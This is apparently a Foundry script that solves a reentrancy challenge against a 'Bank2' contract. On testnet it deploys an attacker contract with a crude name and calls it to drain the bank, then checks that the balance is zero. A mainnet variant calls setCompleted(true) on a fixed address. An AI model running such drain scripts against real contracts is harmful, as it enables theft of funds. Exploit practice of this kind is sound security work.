// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import "../src/Bank2.sol";

contract Testnet is Script {
    function setUp() public {}
    
    function run() public {
        vm.startBroadcast();

        Bank2 bank2 = new Bank2{value: 0.01 ether}();
        console2.log(address(bank2).balance);

        Bank2Ebalka ebalka = new Bank2Ebalka{value: 0.02 ether}();
        ebalka.ebatt(bank2);

        console2.log(address(bank2).balance);
        require(address(bank2).balance == 0, "can't reenter");

        vm.stopBroadcast();
    }
}

contract Mainnet is Script {
    function setUp() public {}
    
    function run() public {
        vm.startBroadcast();

        Bank2 bank2 = Bank2(payable(0xCf82952384137383f402b79FE206B353D523aea3));
        // console2.log(address(bank2).balance);

        // Bank2Ebalka ebalka = new Bank2Ebalka{value: 0.02 ether}();
        // ebalka.ebatt(bank2);

        // console2.log(address(bank2).balance);
        // require(address(bank2).balance == 0, "can't reenter");
        bank2.setCompleted(true);

        vm.stopBroadcast();
    }
}